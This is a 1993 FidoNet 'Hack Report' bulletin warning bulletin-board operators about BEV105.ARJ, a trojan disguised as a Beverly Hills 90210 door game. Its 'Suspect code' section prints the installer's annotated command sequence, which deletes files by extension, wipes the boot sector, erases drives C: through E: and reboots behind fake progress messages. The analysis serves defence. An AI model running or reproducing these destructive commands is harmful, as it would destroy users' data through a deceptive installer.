     1	  =========================================================================
     2	                                    ||
     3	  From the files of The Hack Squad: ||  by Lee Jackson, Co-Moderator,
     4	                                    ||  FidoNet International Echo SHAREWRE
     5	          The Hack Report           ||  Volume 2, Number 3
     6	         File Test Results          ||  Result Report Date: March 7, 1993
     7	                                    ||
     8	  =========================================================================
     9	  
    10	  *************************************************************************
    11	  *                                                                       *
    12	  *  The following test was performed by and the results are courtesy     *
    13	  *     of Jeff White and Bill Logan of the Pueblo Group in Tuscon,       *
    14	  *         Arizona.  Their assistance is greatly appreciated.            *
    15	  *                                                                       *
    16	  *************************************************************************
    17	
    18	
    19	  File:        BEV105.ARJ
    20	  Size:        79858
    21	  Date/time:   1-15-93   5:09p
    22	
    23	  Description:
    24	
    25	  BEV is described by the scant documentation as a Beverly Hills 90210 
    26	  Adventure DOOR game for WWIV BBSes.  It claims to have dialogue from the 
    27	  actual TV show, and permission from The Fox Network to use such dialogue.
    28	
    29	  =========================================================================
    30	
    31	  Synopsis:
    32	
    33	  Apparently this was a batch file compiled to an COM file.  It renames 
    34	  several of the files included with the archive to programs and executes 
    35	  them.  It is dependent on these programs to do the destruction.
    36	
    37	  Running the INSTALL.COM program to begin installation produces the 
    38	  following screen:
    39	
    40	        Welcome to the 90210 Door Installation Program for WWIV
    41	        Copyright 1992(c) Brian Deborus of Constalion BBS 1@2723
    42	
    43	        This Program will Depact all the files neccesary to run
    44	        the door, including the documentation to run the door.
    45	        The door will run on all WWIV systems using CHAIN.TXT.
    46	        The program will give you frequent updates on installation
    47	        by means of a percentage.
    48	
    49	        Please Make sure when you typed Install you did it in this format
    50	        INSTALL [drive/path] of where you want the door.
    51	        Strike any key when ready...
    52	
    53	  But what is actually happening is outlined below:
    54	
    55	  Renames DORINFO.DIR to IDCKILL.EXE
    56	  Invokes IDCKILL to kill files on current drive with the extensions of:
    57	    BAT, FON, COM, ICE, ZIP, ANS, SYS, SUB, DAT, ARJ, EXE, and C
    58	  Renames DISK_1.VOL to BOOTKILL.EXE
    59	  Invokes BOOTKILL to kill BOOT record on current drive
    60	  Renames 90210.DIR to REBOOT.COM
    61	  Invokes IDCKILL to delete *.* on C:, D:, and E: drives
    62	  Invokes REBOOT.COM to reboot your computer after "installation"
    63	
    64	  The author of this trojan added some "filler" to the archive by renaming 
    65	  some common programs to .DIR files and including them with the archive 
    66	  under the guise of being related to the DOOR game.  Examples:
    67	
    68	  MAIN.DIR
    69	
    70	  This is actually BBSBASE, a common program used by Sysops to keep BBS 
    71	  lists.
    72	
    73	  Screen cut:
    74	
    75	             ﬂﬂﬂﬂ‹ ﬂﬂﬂﬂ‹   €           ﬂﬂﬂﬂ‹  ﬂﬂﬂﬂﬂ‹  €      ‹ﬂﬂﬂ
    76	             € ‹‹ﬂ € ‹‹ﬂ   ﬂ‹‹         € ‹‹ﬂ  €    €  ﬂ‹‹    €
    77	             €   € €   €      ﬂ‹       €   €  € ﬂﬂﬂ€     ﬂ‹  € ﬂﬂ
    78	             €‹‹‹ﬂ €‹‹‹ﬂ  ‹‹‹‹‹ﬂ       €‹‹‹ﬂ  €    € ‹‹‹‹‹ﬂ  ﬂ‹‹‹
    79	
    80	                              Version 1.00  (c) 1988
    81	                              User Supported Software
    82	
    83	         If  you are  an avid BBSer  like me, you  know  what  it feels
    84	         like to  try and  organize  all  those  BBS  names and numbers
    85	         that  you constantly  collect.  At first, I tried to use index
    86	         cards, but that got really out of hand.
    87	           So,  I wrote this  program to keep  track of those myriad of
    88	         numbers  and names  that once collected on my desk.  The power
    89	         of  this  program  is  simply amazing. I have included alot of
    90	         extras in this program that would take for hours to do by hand
    91	         I have  tried  to keep  it as  user  friendly as possible too.
    92	
    93	                Written in Turbo Pascal Version 3.0 by Steve Lutz
    94	
    95	                P R E S S   A N Y   K E Y   T O   C O N T I N U E
    96	
    97	  CHAR.DIR
    98	
    99	  This is evidently an auto-extract and/or install program for another 
   100	  program.  The GENESIS.EXE file does not come with BEV105, so the program 
   101	  just errors out.
   102	
   103	  Screen cut:
   104	
   105	        AutoLHarc 1.15 (c)Yoshi, 1988-1990.
   106	
   107	        Extract from : 'GENESIS.EXE'
   108	        Melting : 'GENESIS.COM'
   109	        o...............................................
   110	
   111	        Error In Archive.
   112	
   113	  DOCS.DIR
   114	
   115	  Unknown.  This is a program, but invoking it does not bring any response.
   116	
   117	  =========================================================================
   118	
   119	  Contents:
   120	
   121	  ARJ 2.30 Copyright (c) 1990-92 Robert K Jung. Jan 19 1992 
   122	  NOT REGISTERED for business, commercial, or government use.
   123	
   124	  Processing archive: C:\SUSPECT\BEV105.ARJ
   125	  Archive date      : 1993-01-15 17:10:04
   126	  Sequence/Pathname/Comment
   127	  Rev Host OS    Original Compressed Ratio DateTime modified CRC-32
   128	  ============ ========== ========== ===== ================= ========
   129	  001) DORINFO.DIR
   130	   3  MS-DOS         4135       1996 0.483 92-08-28 18:27:52 4BE0E6FE
   131	  002) README.1ST
   132	   3  MS-DOS         1414        750 0.530 93-01-15 17:09:38 9A392726
   133	  003) 90210.DIR
   134	   3  MS-DOS           16         16 1.000 92-08-28 23:07:14 6D232072
   135	  004) CHAR.DIR
   136	   3  MS-DOS        21108      16675 0.790 92-08-28 19:02:54 8B911883
   137	  005) MAIN.DIR
   138	   3  MS-DOS        63733      30221 0.474 92-08-28 19:02:40 FE66BA29
   139	  006) DISK_1.VOL
   140	   3  MS-DOS           96         96 1.000 92-08-28 02:03:36 6ABF751F
   141	  007) DOCS.DIR
   142	   3  MS-DOS        39408      25166 0.639 92-08-28 16:58:50 0230EF50
   143	  008) INSTALL.COM
   144	   3  MS-DOS        41088       3343 0.081 92-08-28 16:22:02 A5FEE2C8
   145	  ============ ========== ========== =====
   146	      8 files      170998      78263 0.458
   147	
   148	  =========================================================================
   149	
   150	  File Validations:
   151	
   152	  File Name:  90210.dir    Size:  16        Date:  8-28-1992
   153	  File Authentication:   Check Method 1 - 70EC    Check Method 2 - 0565
   154	
   155	  File Name:  char.dir     Size:  21,108    Date:  8-28-1992
   156	  File Authentication:   Check Method 1 - FF27    Check Method 2 - 0039
   157	
   158	  File Name:  disk_1.vol   Size:  96        Date:  8-28-1992
   159	  File Authentication:   Check Method 1 - AB28    Check Method 2 - 0510
   160	
   161	  File Name:  docs.dir     Size:  39,408    Date:  8-28-1992
   162	  File Authentication:   Check Method 1 - B9B0    Check Method 2 - 1C92
   163	
   164	  File Name:  dorinfo.dir  Size:  4,135     Date:  8-28-1992
   165	  File Authentication:   Check Method 1 - 8930    Check Method 2 - 0F58
   166	
   167	  File Name:  install.com  Size:  41,088    Date:  8-28-1992
   168	  File Authentication:   Check Method 1 - 6D5A    Check Method 2 - 1ED0
   169	
   170	  File Name:  main.dir     Size:  63,733    Date:  8-28-1992
   171	  File Authentication:   Check Method 1 - 5572    Check Method 2 - 0A7D
   172	
   173	  File Name:  readme.1st   Size:  1,414     Date:  1-15-1993
   174	  File Authentication:   Check Method 1 - B6DD    Check Method 2 - 1DEC
   175	
   176	  =========================================================================
   177	
   178	  Viral activity:  None detected
   179	
   180	  =========================================================================
   181	
   182	  Suspect code:
   183	
   184	  Here is an extract directly from the INSTALL.COM file which shows the 
   185	  path of destruction.  Comments were added by myself to point out what is 
   186	  going on line-by-line.
   187	
   188	  /C REN Dorinfo.dir idckill.exe <-- REN DORINFO.DIR to the IDCKILL 
   189	                                     program
   190	  IDCKILL *.bat [a]              <-- Kill all BAT files
   191	  Exploding Files - (10%)        <-- Let user think installation is
   192	                                     10% done
   193	  IDCKILL *.fon [a]              <-- Kill any FON (phone) files
   194	  IDCKILL *.com [a]              <-- Kill all COM files
   195	  Exploding Files - (25%)        <-- Let user think installation is 
   196	                                     25% done
   197	  IDCKILL *.ice [a]              <-- Kill all ICE files
   198	  IDCKILL *.zip [a]              <-- Kill all ZIP files
   199	  Exploding Files - (40%)        <-- Let user think installation is 
   200	                                     40% done
   201	  IDCKILL *.ans [a]              <-- Kill all ANS files
   202	  IDCKILL *.sys [a]              <-- Kill all SYS files
   203	  IDCKILL *.sub [a]              <-- Kill all SUB files
   204	  IDCKILL *.dat[a]               <-- Kill all DAT files
   205	  Exploding Files - (50%)        <-- Let user think installation is 
   206	                                     50% done
   207	  IDCKILL *.arj [a]              <-- Kill all ARJ files
   208	  IDCKILL        *.c [a]         <-- Kill all C files
   209	  Exploding Files - (60%)        <-- Let user think installation is 
   210	                                     60% done
   211	  IDCKILL *.exe [a]              <-- Kill all EXE files
   212	  Exploding Files - (85%)        <-- Let user think installation is 
   213	                                     85% done
   214	  /C REN DISK_1.VOL bootkill.com <-- REN DISK_1.VOL to the BOOTKILL 
   215	                                     program
   216	  BOOTKILL@                      <-- Execute BOOTKILL to kill 
   217	                                     BOOT sector
   218	  /C REN CHAR.DAT Genesis.EXE    <-- REN CHAR.DAT to the GENESIS.EXE
   219	                                     program
   220	  Exploding Files - (95%)        <-- Let user think installation is 
   221	                                     95% done
   222	  /C REN 90210.DIR reboot.com    <-- REN 90210.DIR to REBOOT.COM program
   223	  Exploding Files (DONE!)        <-- Let user think file expansion is done
   224	  Building Excutable Files.. Please Wait.. (May take up to 5 minutes)
   225	  IDCKILL        *.* [a]         <-- Erase all of DRIVE C:
   226	  /C c:
   227	  IDCKILL        *.* [a]         <-- Erase all of DRIVE D:
   228	  /C d:
   229	  IDCKILL        *.* [a]         <-- Erase all of DRIVE E:
   230	  /C e:
   231	  IDCKILL        *.* [a]         <-- Erase all of current drive
   232	  Program Finished... Beverly Hills 90210 door install complete!
   233	  REBOOT@                        <-- Reboot computer
   234	
   235	  =========================================================================
